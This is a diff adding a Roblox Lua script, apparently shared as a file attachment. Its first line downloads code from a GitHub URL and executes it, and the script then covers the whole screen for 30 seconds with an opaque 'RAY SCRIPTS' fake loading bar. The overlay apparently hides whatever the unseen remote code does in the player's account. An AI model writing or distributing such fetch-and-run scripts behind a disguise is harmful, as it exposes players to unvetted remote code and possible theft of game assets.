@@ -1,0 +1,86 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/RobloxHub123/addoptme/refs/heads/main/adoptmehub'))()
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create background frame (fully black and opaque)
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1, 0, 1, 0)
+background.BackgroundColor3 = Color3.new(0, 0, 0)
+background.BackgroundTransparency = 0 -- Fully opaque
+background.Parent = screenGui
+
+-- Create Title Text
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(0.5, 0, 0.15, 0)
+title.Position = UDim2.new(0.25, 0, 0.3, 0)
+title.BackgroundTransparency = 1
+title.Text = "RAY SCRIPTS"
+title.TextColor3 = Color3.fromRGB(255, 0, 0)
+title.Font = Enum.Font.GothamBlack
+title.TextScaled = true
+title.Parent = background
+
+-- Create Subtitle Text
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(0.5, 0, 0.05, 0)
+subtitle.Position = UDim2.new(0.25, 0, 0.43, 0)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "sub to kelvsontop!!"
+subtitle.TextColor3 = Color3.fromRGB(255, 0, 0)
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextScaled = true
+subtitle.Parent = background
+
+-- Create Loading Bar Frame
+local loadingBarBackground = Instance.new("Frame")
+loadingBarBackground.Size = UDim2.new(0.6, 0, 0.05, 0)
+loadingBarBackground.Position = UDim2.new(0.2, 0, 0.55, 0)
+loadingBarBackground.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+loadingBarBackground.BorderSizePixel = 0
+loadingBarBackground.Parent = background
+
+local loadingBar = Instance.new("Frame")
+loadingBar.Size = UDim2.new(0, 0, 1, 0)
+loadingBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+loadingBar.BorderSizePixel = 0
+loadingBar.Parent = loadingBarBackground
+
+-- Create Animated Image (spinning)
+local animationImage = Instance.new("ImageLabel")
+animationImage.Size = UDim2.new(0.1, 0, 0.1, 0)
+animationImage.Position = UDim2.new(0.45, 0, 0.68, 0)
+animationImage.BackgroundTransparency = 1
+animationImage.Image = "rbxassetid://6031094678"
+animationImage.Parent = background
+
+-- Spin Animation
+local runService = game:GetService("RunService")
+local rotation = 0
+runService.RenderStepped:Connect(function(dt)
+	rotation = rotation + (180 * dt)
+	animationImage.Rotation = rotation
+end)
+
+-- Loading Bar Animation (30 seconds)
+local tweenService = game:GetService("TweenService")
+local tweenInfo = TweenInfo.new(30, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
+local tween = tweenService:Create(loadingBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
+
+tween:Play()
+
+-- Pulse Animation for Subtitle (Color)
+local colorPulseTweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true)
+local colorPulseTween = tweenService:Create(subtitle, colorPulseTweenInfo, {TextColor3 = Color3.fromRGB(255, 255, 255)})
+
+colorPulseTween:Play()
+
+-- Remove Screen After Loading Completes
+tween.Completed:Connect(function()
+	screenGui:Destroy()
+end)
+message.txt
+4 KB
